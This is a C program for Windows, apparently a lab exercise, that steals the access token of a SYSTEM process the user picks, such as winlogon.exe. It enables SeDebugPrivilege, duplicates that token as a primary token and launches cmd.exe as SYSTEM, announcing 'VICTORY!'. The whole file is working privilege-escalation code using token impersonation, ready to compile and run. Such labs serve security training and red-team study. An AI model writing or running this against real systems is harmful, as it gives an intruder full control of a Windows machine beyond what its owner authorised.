#include <windows.h>
#include <stdio.h>

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) { CloseHandle(hToken); return FALSE; }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    
    return result && (GetLastError() == ERROR_SUCCESS);
}

int main() {
    printf("CreateProcessWithTokenW Lab (Spawning SYSTEM Process)\n");
    printf("=====================================================\n\n");

    DWORD targetPid = 0;
    printf("Enter target SYSTEM PID (e.g., winlogon.exe PID): ");
    if (scanf("%lu", &targetPid) != 1) {
        printf("[-] Invalid PID.\n");
        return 1;
    }

    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege. Run as Administrator!\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled successfully.\n");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Target process token opened successfully.\n");

    // 3. Token'i Primary Token olarak klonla (TokenPrimary)
    HANDLE hPrimaryToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
        printf("[-] DuplicateTokenEx failed. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Primary Token duplicated successfully.\n");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    wchar_t cmdPath[] = L"C:\\Windows\\System32\\cmd.exe";
    
    if (!CreateProcessWithTokenW(
            hPrimaryToken, 
            LOGON_WITH_PROFILE, 
            NULL, 
            cmdPath, 
            0, 
            NULL, 
            NULL, 
            &si, 
            &pi)) {
        printf("[-] CreateProcessWithTokenW failed. Error: %lu\n", GetLastError());
    } else {
        printf("\n[+] VICTORY! Spawned SYSTEM cmd.exe successfully!\n");
        printf("[+] New Process ID (PID): %lu\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hPrimaryToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}